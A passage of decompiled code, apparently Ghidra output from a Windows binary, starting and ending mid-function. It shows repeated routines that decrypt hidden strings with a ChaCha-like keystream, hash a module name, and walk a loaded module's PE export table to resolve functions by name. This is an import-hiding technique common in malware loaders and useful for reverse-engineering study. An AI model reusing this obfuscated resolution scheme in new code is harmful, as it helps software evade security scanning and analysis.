  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0xc);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 10);
  uVar13 = *(uint *)(param_2 + 0x18);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0x17);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_14000aa96;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_14000aa96:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_14000ab00 @ 14000ab00 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_14000ab00(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0x10);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0xd);
  uVar13 = *(uint *)(param_2 + 0xc);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 9);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_14000ae56;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_14000ae56:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_14000aec0 @ 14000aec0 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_14000aec0(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0x10);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
